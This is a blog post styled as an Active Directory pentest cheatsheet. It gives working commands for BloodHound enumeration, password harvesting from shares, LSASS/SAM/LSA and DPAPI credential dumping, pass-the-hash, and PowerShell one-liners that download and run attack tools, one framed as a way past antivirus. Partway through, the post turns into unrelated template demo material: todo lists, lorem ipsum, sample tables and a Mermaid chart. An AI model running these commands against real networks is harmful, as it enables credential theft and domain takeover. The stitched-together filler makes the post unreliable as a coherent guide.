---
title: Active Directory Pentest
author: asphixie
date: 2023-03-10 20:55:00 +0800
categories: [Active Directory, Pentest Cheatsheet]
pin: true
comments: false
---

Active Directory Pentesting steps.

## Mapping & Enumeration

### Basic Bloodhound

Use BloodHound to find compromission paths. First execute the collector on a host that is in the targeted domain.

```powershell
powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString(‘https://raw.githubusercontent.com/puckiestyle/powershell/master/SharpHound.ps1’);Invoke-BloodHound"
```
{: .nolineno }

If it's possible, execute SharpHound. Otherwise, on Linux, you can use the python version, remotely. More information here : <https://github.com/BloodHoundAD/SharpHound> and <https://github.com/fox-it/BloodHound.py>.

```bash
python3 bloodhound.py -u 'XXX' -dc 'DOMAIN' -c all
```
{: .nolineno }

The tool gives you a .zip file, that you have to send to a Neo4j database. On Linux, install Neo4j and start the service :

```bash
sudo neo4j start
```
{: .nolineno }

Then execute BloodHound and import the zip file.

### Extended Bloodhound (PKI)

Best thing to do is to use Certipy to get a bloodhound extract, including everything about ADCS (templates, etc.) :

```bash
certipy find -bloodhound -u USER@DOMAIN -p 'PASSWORD' -dc-ip DC_IP
```
{: .nolineno }

Then, use Olivier Lyak's bloohound, which includes PKIs stuff (<https://github.com/ly4k/BloodHound>). This will give you the opportunity to check for a lot of knows attacks on ADCS (ESC1 to ESC10).

### Goddi

To get all the important information from the Active Directory :

```bash
./goddi-linux-amd64 -dc IP_DC -domain=DOMAIN -username=USERNAME -password=PASSWORD -unsafe
```
{: .nolineno }

---
## Shares

Dump all shares via CrackMapExec. This can be used on native Kali distribution :

```bash
crackmapexec smb IP_ADDRESS/MASK -u 'XXX' -p 'XXX' -M spider_plus -o READ_ONLY=false
```
{: .nolineno }

This command create a directory cme_spider_plus in /tmp (for Linux). To retrive passwords, simply use grep, by using keywords like 'password', 'pass', 'username', 'ldap://', etc.

```bash
grep -rnw ./ -e 'password'
```
{: .nolineno }

If detected by AV/EDR, try PowerShell one-liner PowerView :

```powershell
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')"
```
{: .nolineno }

Then, a lot of functionalities can be used. To find all domain shares :

```powershell
Find-DomainShare -CheckShareAccess
```
{: .nolineno }

All the functionalities here : <https://powersploit.readthedocs.io/en/latest/Recon/>

---
## Dump credentials

### CrackMapExec

Many possibilites. Use --local-auth if using a local admin account.
With lsassy module :

```bash
crackmapexec smb IP_ADDRESS/MASK -d 'DOMAIN'-u 'USER' -p 'PASSWORD' -M lsassy
```
{: .nolineno }

Dump SAM (local hashes) :

```bash
crackmapexec smb IP_ADDRESS/MASK -d 'DOMAIN'-u 'USER' -p 'PASSWORD' --sam
```
{: .nolineno }

Dump LSA secrets :

```bash
crackmapexec smb IP_ADDRESS/MASK -d 'DOMAIN'-u 'USER' -p 'PASSWORD' --lsa
```
{: .nolineno }

Many possibilites here, if you get passwords or NTLM hashes, you know what to do. There's others possibilites too, like authenticating with AES keys (you can use 256 or 128 bits keys). You can get it by dumping LSA secrets. Once you get one, you can use the AES keys with Impacket to do whatever you want, and also get a TGT :

```bash
impacket-getTGT domain.local/username -aesKey AES_KEY -dc-ip DC_IP
```
{: .nolineno }

### DonPAPI

Use DonPAPI to retrieve a lot of credentials (wifi, dpapi keys, browsers passwords, ...) :

```bash
python3 DonPAPI.py DOMAIN/USERNAME:PASSWORD@IP_ADDRESS
```
{: .nolineno }

It's possible to use the tool with Pass-The-Hash :

```bash
python3 DonPAPI.py DOMAIN/USERNAME@IP_ADDRESS --hashes LM:NT
```
{: .nolineno }

If you get a valid admin account, dump the domain backup key. This backup key (.pvk) can then be used to dump all domain user's secrets :

```bash
impacket-dpapi backupkeys --export -t domain.local/username@DC_FQDN -k -no-pass
```
{: .nolineno }

Then, use the domain backup key on all machine, with one command. Extract all FQDN in a file (targets for example) and then :

```bash
python3 DonPAPI.py -pvk pathtofile.pvk domain.local/username@targets -k -no-pass
```
{: .nolineno }

You can parse the output by using this magic one-liner :

```bash
cat DonPapiOutput.txt | grep -ae 'Firefox Password' -e 'Chrome Password' | cut -d : -f 3 | cut -d ' ' -f 2 | sort | uniq >> motdepasse.txt && cat DonPapiOutput.txt | grep -ae '\[mRemoteNG\]' | cut -d : -f 2 | cut -d ' ' -f 1 | sort | uniq >> motdepasse.txt & cat motdepasse.txt | sort | uniq | sed "s,\x1B\[[0-9;]*[a-zA-Z],,g" > motdepasse.txt
```
{: .nolineno }

### Mimikatz

On Windows, retrieve password/hash from a dump file :

```powershell
sekurlsa::minidump "XXXXXXXXX.DMP"
sekurlsa::logonPasswords
```

On Kali, use pypykatz based on python :

```bash
pypykatz lsa minidump 'XXX.DMP'
```
{: .nolineno }

### Others

Native Windows command :

```markdown
rundll32 keymgr.dll, KRShowKeyMgr
```
{: .nolineno }

Savoir : Mimikatz recompiled in Go lang : <https://github.com/vincd/savoir>

---
## Impersonation

### ToDo list

- [ ] Job
  + [x] Step 1
  + [x] Step 2
  + [ ] Step 3

### Description list

Sun
: the star around which the earth orbits

Moon
: the natural satellite of the earth, visible by reflected light from the sun

## Block Quote

> This line shows the _block quote_.
## Prompts

> An example showing the `tip` type prompt.
{: .prompt-tip }
> An example showing the `info` type prompt.
{: .prompt-info }
> An example showing the `warning` type prompt.
{: .prompt-warning }
> An example showing the `danger` type prompt.
{: .prompt-danger }
## Tables

| Company                      | Contact          | Country |
|:-----------------------------|:-----------------|--------:|
| Alfreds Futterkiste          | Maria Anders     | Germany |
| Island Trading               | Helen Bennett    | UK      |
| Magazzini Alimentari Riuniti | Giovanni Rovelli | Italy   |

## Links

<http://127.0.0.1:4000>

## Footnote

Click the hook will locate the footnote[^footnote], and here is another footnote[^fn-nth-2].

## Inline code

This is an example of `Inline Code`.

## Filepath

Here is the `/path/to/the/file.extend`{: .filepath}.

## Code blocks

### Common

```
This is a common code snippet, without syntax highlight and line number.
```

### Specific Language

```bash
if [ $? -ne 0 ]; then
  echo "The command was not successful.";
  #do the needful / exit
fi;
```

### Specific filename

```sass
@import
  "colors/light-typography",
  "colors/dark-typography"
```
{: file='_sass/jekyll-theme-chirpy.scss'}

## Mathematics

The mathematics powered by [**MathJax**](https://www.mathjax.org/):

$$ \sum_{n=1}^\infty 1/n^2 = \frac{\pi^2}{6} $$

When $a \ne 0$, there are two solutions to $ax^2 + bx + c = 0$ and they are

$$ x = {-b \pm \sqrt{b^2-4ac} \over 2a} $$

## Mermaid SVG

```mermaid
 gantt
  title  Adding GANTT diagram functionality to mermaid
  apple :a, 2017-07-20, 1w
  banana :crit, b, 2017-07-23, 1d
  cherry :active, c, after b a, 1d
```

## Images

### Default (with caption)

![Desktop View](/posts/20190808/mockup.png){: width="972" height="589" }
_Full screen width and center alignment_

### Left aligned

![Desktop View](/posts/20190808/mockup.png){: width="972" height="589" .w-75 .normal}

### Float to left

![Desktop View](/posts/20190808/mockup.png){: width="972" height="589" .w-50 .left}
Praesent maximus aliquam sapien. Sed vel neque in dolor pulvinar auctor. Maecenas pharetra, sem sit amet interdum posuere, tellus lacus eleifend magna, ac lobortis felis ipsum id sapien. Proin ornare rutrum metus, ac convallis diam volutpat sit amet. Phasellus volutpat, elit sit amet tincidunt mollis, felis mi scelerisque mauris, ut facilisis leo magna accumsan sapien. In rutrum vehicula nisl eget tempor. Nullam maximus ullamcorper libero non maximus. Integer ultricies velit id convallis varius. Praesent eu nisl eu urna finibus ultrices id nec ex. Mauris ac mattis quam. Fusce aliquam est nec sapien bibendum, vitae malesuada ligula condimentum.

### Float to right

![Desktop View](/posts/20190808/mockup.png){: width="972" height="589" .w-50 .right}
Praesent maximus aliquam sapien. Sed vel neque in dolor pulvinar auctor. Maecenas pharetra, sem sit amet interdum posuere, tellus lacus eleifend magna, ac lobortis felis ipsum id sapien. Proin ornare rutrum metus, ac convallis diam volutpat sit amet. Phasellus volutpat, elit sit amet tincidunt mollis, felis mi scelerisque mauris, ut facilisis leo magna accumsan sapien. In rutrum vehicula nisl eget tempor. Nullam maximus ullamcorper libero non maximus. Integer ultricies velit id convallis varius. Praesent eu nisl eu urna finibus ultrices id nec ex. Mauris ac mattis quam. Fusce aliquam est nec sapien bibendum, vitae malesuada ligula condimentum.

### Dark/Light mode & Shadow

The image below will toggle dark/light mode based on theme preference, notice it has shadows.

![light mode only](/posts/20190808/devtools-light.png){: .light .w-75 .shadow .rounded-10 w='1212' h='668' }
![dark mode only](/posts/20190808/devtools-dark.png){: .dark .w-75 .shadow .rounded-10 w='1212' h='668' }

## Video

{% include embed/youtube.html id='Balreaj8Yqs' %}

## Reverse Footnote

[^footnote]: The footnote source
[^fn-nth-2]: The 2nd footnote source
